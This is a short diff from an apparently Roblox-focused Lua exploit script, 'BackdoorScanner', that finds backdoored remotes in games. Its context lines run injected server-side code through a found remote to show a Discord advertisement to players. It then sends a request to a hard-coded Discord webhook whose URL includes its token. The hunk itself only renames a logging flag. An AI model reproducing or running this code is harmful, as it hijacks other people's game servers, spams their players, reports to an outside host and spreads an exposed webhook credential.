@@ -262,7 +262,7 @@ function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
             self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
 
             local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-            if request and _G.Hexon_Log then
+            if request and _G.Game_Log then
                 pcall(function()
                     request({
                         Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
